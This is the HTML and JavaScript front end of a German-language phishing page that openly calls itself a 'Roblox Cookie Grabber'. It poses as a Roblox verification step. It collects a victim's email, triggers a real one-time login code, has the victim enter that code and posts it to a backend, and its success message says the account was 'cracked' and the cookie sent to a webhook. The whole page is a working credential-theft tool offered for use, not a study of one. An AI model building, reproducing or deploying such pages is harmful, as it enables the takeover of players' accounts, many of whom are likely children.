<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BLUE LED • ROBLOX VERIFY</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', monospace, system-ui;
            background: #000510;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            position: relative;
            overflow-x: hidden;
        }

        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: radial-gradient(circle at 50% 50%, #00a6ff20 0%, transparent 60%);
            pointer-events: none;
            animation: ledPulse 4s ease-in-out infinite;
            z-index: 0;
        }

        @keyframes ledPulse {
            0%, 100% { opacity: 0.3; }
            50% { opacity: 0.8; }
        }

        .grid-overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-image: 
                linear-gradient(#00a6ff10 1px, transparent 1px),
                linear-gradient(90deg, #00a6ff10 1px, transparent 1px);
            background-size: 50px 50px;
            pointer-events: none;
            z-index: 0;
        }

        .container {
            position: relative;
            z-index: 1;
            max-width: 500px;
            width: 100%;
            background: #0a1428;
            border: 3px solid #00a6ff;
            border-radius: 30px;
            padding: 40px;
            box-shadow: 
                0 0 30px #00a6ff,
                inset 0 0 20px #00a6ff40;
        }

        h1 {
            color: #00a6ff;
            font-size: 2.2em;
            text-align: center;
            margin-bottom: 10px;
            text-transform: uppercase;
            letter-spacing: 3px;
            text-shadow: 0 0 10px #00a6ff;
        }

        .subtitle {
            color: #7aa9ff;
            text-align: center;
            margin-bottom: 30px;
            font-size: 1em;
            border-bottom: 2px solid #00a6ff40;
            padding-bottom: 20px;
        }

        .step-box {
            background: #0f1a30;
            border: 2px solid #00a6ff;
            border-radius: 20px;
            padding: 25px;
            margin-bottom: 20px;
        }

        .step-title {
            color: #00a6ff;
            font-size: 1.2em;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .step-number {
            background: #00a6ff;
            color: #000;
            width: 25px;
            height: 25px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
        }

        input {
            width: 100%;
            background: #0a1428;
            border: 2px solid #00a6ff;
            border-radius: 15px;
            padding: 15px;
            color: #00a6ff;
            font-size: 16px;
            margin: 10px 0;
        }

        input:focus {
            outline: none;
            box-shadow: 0 0 15px #00a6ff;
        }

        button {
            width: 100%;
            background: transparent;
            border: 2px solid #00a6ff;
            color: #00a6ff;
            padding: 15px;
            border-radius: 15px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
            margin: 10px 0;
        }

        button:hover:not(:disabled) {
            background: #00a6ff;
            color: #000;
            box-shadow: 0 0 20px #00a6ff;
        }

        button:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }

        .status-box {
            background: #0a1428;
            border: 2px solid #00a6ff;
            border-radius: 15px;
            padding: 20px;
            margin: 20px 0;
            color: #7aa9ff;
            font-family: monospace;
        }

        .hidden {
            display: none;
        }

        .success {
            color: #00ff88;
            text-align: center;
            font-size: 1.2em;
            margin: 20px 0;
        }

        .footer {
            text-align: center;
            margin-top: 30px;
            color: #7aa9ff;
            font-size: 0.8em;
        }

        .loading {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid #00a6ff40;
            border-top-color: #00a6ff;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .warning {
            color: #ffaa00;
            font-size: 0.9em;
            text-align: center;
            margin: 10px 0;
        }
    </style>
</head>
<body>
    <div class="grid-overlay"></div>

    <div class="container">
        <h1>🔵 ROBLOX VERIFY</h1>
        <div class="subtitle">Cookie Grabber • One-Time Code</div>

        <!-- STEP 1: EMAIL EINGABE -->
        <div class="step-box" id="step1">
            <div class="step-title">
                <span class="step-number">1</span>
                <span>Email eingeben (Roblox Account)</span>
            </div>
            <div class="warning">
                ⚠️ Email muss bei Roblox VERIFIZIERT sein!
            </div>
            <input type="email" id="emailInput" placeholder="deine@email.com">
            <button onclick="sendOneTimeCode()" id="sendBtn">📧 CODE ANFORDERN</button>
        </div>

        <!-- STEP 2: CODE EINGABE -->
        <div class="step-box hidden" id="step2">
            <div class="step-title">
                <span class="step-number">2</span>
                <span>Code von Roblox eingeben</span>
            </div>
            
            <div class="status-box">
                <div style="margin-bottom: 15px;">✅ Roblox hat einen Code an deine Email geschickt!</div>
                <div style="color: #ffaa00; font-size: 0.9em;">
                    ⏱️ Code ist 15 Minuten gültig<br>
                    📁 Check auch SPAM-Ordner!
                </div>
            </div>
            
            <input type="text" id="codeInput" placeholder="6-stelligen Code eingeben" maxlength="6">
            <button onclick="exchangeCode()" id="exchangeBtn">🔄 CODE EINLÖSEN & COOKIE HOLEN</button>
            <div id="verifyStatus" style="text-align: center; margin-top: 10px;"></div>
        </div>

        <!-- STEP 3: SUCCESS -->
        <div class="step-box hidden" id="step3">
            <div class="step-title">
                <span class="step-number">✅</span>
                <span>COOKIE ERBEUTET!</span>
            </div>
            
            <div class="success" id="successMessage">
                Account erfolgreich geknackt!<br>
                <span style="font-size: 0.8em;">Cookie wurde an Webhook gesendet</span>
            </div>
        </div>

        <div class="footer">
            🔵 BLUE LED • ROBLOX COOKIE GRABBER
        </div>
    </div>

    <script>
        let currentEmail = '';

        async function sendOneTimeCode() {
            const email = document.getElementById('emailInput').value.trim();
            
            if (!email || !email.includes('@')) {
                alert('Bitte gültige Email eingeben!');
                return;
            }

            currentEmail = email;
            document.getElementById('step1').classList.add('hidden');
            document.getElementById('step2').classList.remove('hidden');
            document.getElementById('sendBtn').disabled = true;

            try {
                const response = await fetch('/api/send-code', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ email: currentEmail })
                });

                const data = await response.json();

                if (!data.success) {
                    throw new Error(data.error || 'Fehler beim Senden');
                }

                document.getElementById('verifyStatus').innerHTML = '📧 Code wurde angefordert! Bitte Email checken.';

            } catch (error) {
                document.getElementById('verifyStatus').innerHTML = `❌ Fehler: ${error.message}`;
                document.getElementById('sendBtn').disabled = false;
            }
        }

        async function exchangeCode() {
            const userCode = document.getElementById('codeInput').value.trim();
            
            if (!userCode || userCode.length !== 6) {
                alert('Bitte 6-stelligen Code eingeben!');
                return;
            }

            document.getElementById('verifyStatus').innerHTML = '🔄 Tausche Code gegen Cookie...';
            document.getElementById('exchangeBtn').disabled = true;

            try {
                const response = await fetch('/api/exchange-code', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        email: currentEmail,
                        code: userCode
                    })
                });

                const data = await response.json();

                if (data.success) {
                    document.getElementById('step2').classList.add('hidden');
                    document.getElementById('step3').classList.remove('hidden');
                } else {
                    throw new Error(data.error || 'Fehler beim Einlösen');
                }

            } catch (error) {
                document.getElementById('verifyStatus').innerHTML = `❌ Fehler: ${error.message}`;
                document.getElementById('exchangeBtn').disabled = false;
            }
        }
    </script>
</body>
</html>
